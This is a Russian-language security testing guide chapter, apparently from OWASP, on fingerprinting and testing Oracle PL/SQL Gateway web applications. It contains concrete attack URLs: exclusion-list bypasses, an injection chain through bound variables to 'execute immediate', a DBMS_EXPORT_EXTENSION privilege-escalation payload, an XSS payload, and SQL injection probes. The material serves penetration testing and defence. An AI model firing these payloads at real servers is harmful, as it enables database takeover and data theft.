    Oracle¶

    Резюме¶

    Веб-приложения на базе PL/SQL функционируют за счет шлюза PL/SQL Gateway, который транслирует веб-запросы в запросы к базе данных. Во многих современных инсталляциях этот функционал реализуется через Oracle REST Data Services (ORDS), часто выступающий фронтендом для Oracle APEX. В устаревших инфраструктурах до сих пор могут использоваться Apache mod_plsql, Oracle HTTP Server, Oracle Application Server, Portal, предшественники HTML DB / APEX, WebDB или веб-сервер XML Database (XDB).

    Эта глава посвящена идентификации и тестированию эндпоинтов PL/SQL Gateway, включая устаревшие развертывания mod_plsql и Application Server, которые продолжают эксплуатироваться в продакшене. Применяйте аналогичный подход к проверке валидации входных данных для поверхностей атак ORDS и APEX, а для приложений на базе Oracle, не использующих данный шлюз, руководствуйтесь общими рекомендациями главы SQL Injection.

    Методика тестирования¶

    Принцип работы шлюза PL/SQL¶

    По сути, PL/SQL Gateway действует как прокси-сервер, принимающий веб-запрос пользователя и передающий его серверу базы данных, где он непосредственно выполняется.

    1. Веб-сервер принимает запрос от веб-клиента и определяет, должен ли он обрабатываться через PL/SQL Gateway.
    2. PL/SQL Gateway обрабатывает запрос, извлекая имя запрашиваемого пакета, процедуры и переменных.
    3. Запрашиваемый пакет и процедура оборачиваются в анонимный блок PL/SQL и отправляются на сервер базы данных.
    4. Сервер базы данных выполняет процедуру и возвращает результаты шлюзу Gateway в виде HTML.
    5. Шлюз отправляет ответ через веб-сервер обратно клиенту.

    Понимание этого принципа крайне важно: код PL/SQL находится не на веб-сервере, а непосредственно на сервере базы данных. Это означает, что любые уязвимости в PL/SQL Gateway или в самом приложении PL/SQL в случае их успешной эксплуатации предоставляют атакующему прямой доступ к серверу БД; никакие межсетевые экраны не смогут этому помешать.

    URL-адреса веб-приложений PL/SQL обычно легко узнаваемы и, как правило, начинаются со следующих путей (xyz может быть любой строкой и обозначает дескриптор доступа к базе данных [Database Access Descriptor, DAD], о котором подробно рассказано далее):

    • https://www.example.com/pls/xyz
    • https://www.example.com/xyz/owa
    • https://www.example.com/xyz/plsql

    Второй и третий примеры представляют URL более старых версий PL/SQL Gateway; первый характерен для Apache mod_plsql (/pls является стандартной директивой Location в файле plsql.conf, хотя этот путь может быть изменен). Сопоставления маршрутов в ORDS зависят от конфигурации и могут не использовать /pls. Отсутствие расширения файла в URL может указывать на присутствие Oracle PL/SQL Gateway. Рассмотрим следующий URL:

    https://www.server.com/aaa/bbb/xxxxx.yyyyy

    Если xxxxx.yyyyy заменить на конструкции вроде ebank.home, store.welcome, auth.login или books.search, то существует высокая вероятность использования PL/SQL Gateway. Также перед запрашиваемым пакетом и процедурой может указываться имя пользователя-владельца (схема БД) — в данном случае пользователя webuser:

    https://www.server.com/pls/xyz/webuser.pkg.proc

    В этом URL xyz — это дескриптор доступа к базе данных (Database Access Descriptor, DAD). DAD указывает параметры подключения к серверу базы данных, необходимые шлюзу PL/SQL Gateway. Он содержит такую информацию, как строка подключения TNS, идентификатор и пароль пользователя, а также методы аутентификации. В Apache mod_plsql эти DAD задаются в конфигурационном файле dads.conf; в более старых листенерах использовался wdbsvr.app. ORDS использует собственные пулы и конфигурационные файлы вместо DAD. Некоторые исторические стандартные имена DAD включают:

    SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE

OWA

    Определение активности шлюза PL/SQL¶

    При проведении аудита безопасности сервера в первую очередь важно определить, с какой именно технологией вы имеете дело. Если это неизвестно заранее (например, при оценке методом «черного ящика»), необходимо это выяснить. Идентифицировать веб-приложение на базе PL/SQL достаточно просто. Во-первых, по формату и структуре URL, рассмотренным выше. Кроме того, существует набор простых тестов, позволяющих проверить наличие PL/SQL Gateway.

    Заголовки ответов сервера¶

    Заголовки ответов сервера могут помочь идентифицировать веб-уровни Oracle, однако они не являются обязательными и не всегда надежны сами по себе. Многие развертывания ORDS и APEX размещаются за обратными прокси или сетями доставки контента (CDN) и возвращают общее значение Server либо вовсе скрывают его. При отсутствии или подмене баннеров ориентируйтесь на структуру URL и описанные ниже зондирующие запросы.

    Полезные признаки при их наличии:

    • Oracle-REST-Data-Services/... (ORDS).
    • Oracle-HTTP-Server, mod_plsql или Oracle-Application-Server (устаревшие Oracle HTTP Server или Application Server).
    • Связанные заголовки, такие как X-ORDS-* или устаревшие X-APEX-*.

    Примеры:

    Server: Oracle-REST-Data-Services/24.2.0.r1234567
Server: Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Server: Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0

    Тест с использованием NULL¶

    В PL/SQL ключевое слово null является абсолютно допустимым выражением:

    SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.

    Мы можем использовать это для проверки, запущен ли на сервере PL/SQL Gateway. Достаточно взять DAD и добавить NULL, а затем NOSUCHPROC:

    • https://www.example.com/pls/dad/null
    • https://www.example.com/pls/dad/nosuchproc

    Если сервер возвращает ответ 200 OK на первый запрос и 404 Not Found на второй, это свидетельствует о работе PL/SQL Gateway на сервере.

    Доступ к известным пакетам¶

    В старых версиях PL/SQL Gateway существует возможность прямого обращения к пакетам, входящим в стандартный набор веб-инструментов PL/SQL Web Toolkit, таким как пакеты OWA и HTP. Одним из таких пакетов является OWA_UTIL, о котором подробнее пойдет речь далее. Этот пакет содержит процедуру SIGNATURE, которая просто выводит сигнатуру PL/SQL в формате HTML. Таким образом, запрос

    https://www.example.com/pls/dad/owa_util.signature

    возвращает следующий вывод на веб-странице:

    "This page was produced by the PL/SQL Web Toolkit on date"

    или

    "This page was produced by the PL/SQL Cartridge on date"

    Если вместо этого вы получаете ответ 403 Forbidden, можно сделать вывод, что PL/SQL Gateway запущен. Именно такой ответ должен возвращаться в более поздних версиях или на пропатченных системах.

    Доступ к произвольным пакетам PL/SQL в базе данных¶

    Существует возможность эксплуатации уязвимостей в пакетах PL/SQL, установленных на сервере баз данных по умолчанию. Способ реализации зависит от версии PL/SQL Gateway. В ранних версиях PL/SQL Gateway ничто не мешало атакующему обращаться к произвольным пакетам PL/SQL на сервере базы данных. Ранее мы упоминали пакет OWA_UTIL. Его можно использовать для выполнения произвольных SQL-запросов:

    https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS

    Атаки межсайтового скриптинга могли запускаться через пакет HTP:

    https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>

    Очевидно, что это представляет серьезную опасность, поэтому компания Oracle ввела список исключений PL/SQL (PLSQL Exclusion list) для блокирования прямого доступа к таким опасным процедурам. Запрещенные элементы включают любые запросы, начинающиеся с SYS.*, любые запросы, начинающиеся с DBMS_*, а также запросы, содержащие HTP.* или OWA*. Однако список исключений можно обойти. Более того, список исключений не блокирует доступ к пакетам в схемах CTXSYS, MDSYS и некоторых других, что позволяет эксплуатировать уязвимости в этих пакетах:

    https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL

    Если сервер базы данных все еще уязвим к этой ошибке (CVE-2006-0265), этот запрос вернет пустую HTML-страницу с кодом 200 OK.

    Уязвимости шлюза PL/SQL¶

    На протяжении многих лет в Oracle PL/SQL Gateway был обнаружен целый ряд уязвимостей, включая доступ к административным страницам (CVE-2002-0561), переполнения буфера (CVE-2002-0559), ошибки обхода каталогов (directory traversal) и бреши, позволяющие атакующим обойти список исключений (Exclusion List) и получить доступ к выполнению произвольных пакетов PL/SQL на сервере базы данных.

    Обход списка исключений PL/SQL¶

    Поразительно, сколько раз Oracle пыталась устранить уязвимости, позволяющие обходить список исключений. Каждый выпущенный патч становился жертвой новой техники обхода. История этой череды уязвимостей

    Обход списка исключений — способ 1¶

    Когда Oracle впервые представила список исключений PL/SQL Exclusion List для предотвращения доступа к произвольным пакетам PL/SQL, его можно было тривиально обойти, добавив перед именем схемы/пакета hex-кодированный символ перевода строки, пробел или табуляцию:

    https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC

    Обход списка исключений — способ 2¶

    В более поздних версиях шлюза атакующие могли обойти список исключений, добавив перед именем схемы/пакета метку (label). В PL/SQL метка указывает на строку кода, к которой можно перейти с помощью оператора GOTO, и имеет следующий вид: <<NAME>>

    • https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC

    Обход списка исключений — способ 3¶

    Простое заключение имени схемы/пакета в двойные кавычки могло позволить обойти список исключений. Некоторые релизы Oracle Application Server (в частности 10g) перед отправкой запроса серверу БД преобразуют его в нижний регистр; поскольку идентификатор в кавычках чувствителен к регистру, SYS и sys не эквивалентны, и запросы к последнему приведут к ошибке 404 Not Found. В более ранних версиях приведенная конструкция позволяла обойти список исключений:

    https://www.example.com/pls/dad/"SYS".PACKAGE.PROC

    Обход списка исключений — способ 4¶

    В зависимости от кодировок, используемых на веб-сервере и сервере баз данных, некоторые символы транслируются. Так, в зависимости от используемых кодировок символ ÿ (0xFF) на сервере БД может преобразовываться в Y. Другим символом, часто конвертируемым в заглавную Y, является знак макрона (Macron) — 0xAF. Это могло позволить атакующему обойти список исключений:

    https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC

    Обход списка исключений — способ 5¶

    Некоторые версии PL/SQL Gateway позволяли обходить список исключений с помощью обратного слеша — 0x5C:

    https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC

    Обход списка исключений — способ 6¶

    Это наиболее сложный и позже всего устраненный метод обхода списка исключений. Если мы отправим следующий запрос:

    https://www.example.com/pls/dad/foo.bar?xyz=123

    сервер приложений выполнит на сервере базы данных следующий PL/SQL-код:

    declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time-start_time__;
end;

    Обратите внимание на строки 19 и 24. В строке 19 запрос пользователя сопоставляется со списком известных «вредоносных» строк (списком исключений). Если запрашиваемые пакет и процедура не содержат запрещенных строк, процедура выполняется в строке 24. Параметр XYZ передается как связанная переменная (bind variable).

    Если затем мы отправим следующий запрос:

    https://server.example.com/pls/dad/INJECT'POINT

    выполнится следующий PL/SQL-код:

    ..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..

    Это приводит к ошибке в журнале: "PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . ." Перед нами вектор внедрения произвольного SQL-кода. Это можно проэксплуатировать для обхода списка исключений. Сначала атакующему необходимо найти процедуру PL/SQL, которая не принимает параметров и не подпадает под правила списка исключений. Этим критериям соответствует достаточно большое количество стандартных пакетов, например:

    JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO

    Атакующий должен выбрать одну из таких функций, которая фактически доступна в целевой системе (то есть возвращает 200 OK при вызове). Для проверки атакующий может отправить запрос:

    https://server.example.com/pls/dad/orasso.home?FOO=BAR

    сервер должен вернуть ответ 404 File Not Found, поскольку процедура orasso.home не принимает параметров, а параметр был передан. Однако до возврата кода 404 выполняется следующий PL/SQL-код:

    ..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..

    Обратите внимание на присутствие FOO в строке запроса атакующего. Злоумышленники могут использовать это для выполнения произвольного SQL. Сначала необходимо закрыть скобки:

    https://server.example.com/pls/dad/orasso.home?);--=BAR

    Это приведет к выполнению следующего PL/SQL-кода:

    ..
orasso.home();--=>:);--);
..

    Все, что идет после двойного дефиса (--), воспринимается как комментарий. Данный запрос вызовет внутреннюю ошибку сервера, так как одна из связанных переменных перестала использоваться, поэтому атакующему нужно добавить ее обратно. Как выясняется, именно эта связанная переменная является ключом к выполнению произвольного PL/SQL. На данном этапе можно просто использовать HTP.PRINT для вывода строки BAR и добавить требуемую связанную переменную как :1:

    https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR

    Этот запрос должен вернуть ответ 200 со словом "BAR" в HTML-коде страницы. Происходит следующее: все, что находится после знака равенства (в данном случае BAR), передается в качестве данных в связанную переменную. С помощью той же техники можно снова получить доступ к owa_util.cellsprint:

    https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS

    Для выполнения произвольного SQL-кода, включая команды DML и DDL, атакующий вставляет конструкцию execute immediate :1:

    https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual

    Примечание: вывод отображен не будет. Эту технику можно использовать для эксплуатации любых уязвимостей внедрения PL/SQL в объектах схемы SYS, что позволяет атакующему получить полный контроль над сервером базы данных. Например, следующий URL эксплуатирует уязвимости внедрения SQL в пакете DBMS_EXPORT_EXTENSION:

    https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;

    Оценка пользовательских веб-приложений PL/SQL¶

    Во время тестирования методом «черного ящика» исходный код пользовательского PL/SQL-приложения недоступен, однако его тем не менее необходимо исследовать на предмет уязвимостей безопасности.

    SQL-инъекция (SQL Injection)¶

    Каждый входной параметр необходимо протестировать на наличие уязвимостей SQL-инъекций. Их легко обнаружить и подтвердить. Для обнаружения достаточно внедрить одинарную кавычку в параметр и проверить реакцию приложения на ошибки (включая ошибки 404 Not Found). Подтвердить наличие SQL-инъекции можно с помощью оператора конкатенации.

    Например, предположим, что существует веб-приложение PL/SQL книжного магазина, позволяющее пользователям искать книги указанного автора:

    https://www.example.com/pls/bookstore/books.search?author=DICKENS

    Если этот запрос возвращает книги Чарльза Диккенса, а запрос

    https://www.example.com/pls/bookstore/books.search?author=DICK'ENS

    возвращает ошибку или код 404, то в приложении может присутствовать уязвимость SQL-инъекции. Это можно подтвердить с помощью оператора конкатенации:

    https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS

    Если этот запрос возвращает книги Чарльза Диккенса, вы подтвердили наличие уязвимости SQL Injection.
